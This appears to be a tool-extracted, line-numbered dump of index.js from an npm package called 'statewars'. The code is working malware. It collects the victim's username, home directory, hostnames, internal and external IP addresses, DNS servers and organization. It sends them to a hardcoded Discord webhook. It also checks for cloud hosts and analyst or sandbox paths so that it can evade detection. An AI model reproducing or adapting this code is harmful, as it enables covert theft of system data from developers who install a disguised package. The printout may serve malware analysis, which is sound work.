// File: tmp/tmpgls13djr/statewars/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: const packageJSON = require("./package.json")
Line 10: for (const interfaceName in networkInterfaces) {
        const iface = networkInterfaces[interfaceName];
        for (const alias of iface) {
            if (alias.family === 'IPv4' && !alias.internal) {
                return alias.address;
            }
        }
    }
Line 11: const iface = networkInterfaces[interfaceName]
Line 12: _iterator_1.next()
Line 22: (_tmp_0 = https.get('https://ipinfo.io/json', (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            const parsedData = JSON.parse(data);
            callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org});
        });
    }))
Line 28: const parsedData = JSON.parse(data)
Line 29: callback({ip: parsedData.ip, hostname: parsedData.hostname, organization: parsedData.org})
Line 33: callback({ip:'External IP not found',hostname:'External hostname not found', organization: 'Organization not found'})
Line 38: {
    const externalHostName = externalIP.hostname;
    const internalHostName = os.hostname();
    const homeDirectory = os.homedir();
    if (externalHostName.includes("compute.amazonaws.com") || externalHostName.includes("bc.googleusercontent.com") || externalHostName.includes("default-rdns.vocus.co.nz") || internalHostName.includes("LD.local") || homeDirectory.includes("C:\\Users\\justin") || homeDirectory.includes("mal_data") || homeDirectory.includes("malicious")) {
        return
    }
    const trackingData = JSON.stringify({
        package: package,
        directory: __dirname,
        home_directory: os.homedir(),
        username: os.userInfo().username,
        dns: dns.getServers(),
        internal_hostname: os.hostname(),
        internal_ip: getIPAddress(), 
        external_ip: externalIP.ip, 
        external_hostname: externalIP.hostname,
        organization: externalIP.organization,
        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
     ...
Line 40: os.hostname()
Line 42: externalHostName.includes("default-rdns.vocus.co.nz")
Line 49: os.userInfo()
Line 51: os.hostname()
Line 52: getIPAddress()
Line 62: const webhookURL = "https://discord.com/api/webhooks/1330015051482005555/5fll497pcjzKBiY3b_oa9YRh-r5Lr69vRyqccawXuWE_horIlhwOYzp23JWm-iSXuPfQ"
Line 76: const req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    })
Line 77: {
            process.stdout.write(d);
        }
Line 78: process.stdout.write(d)
Line 86: req.write(postData)
Line 87: req.end()
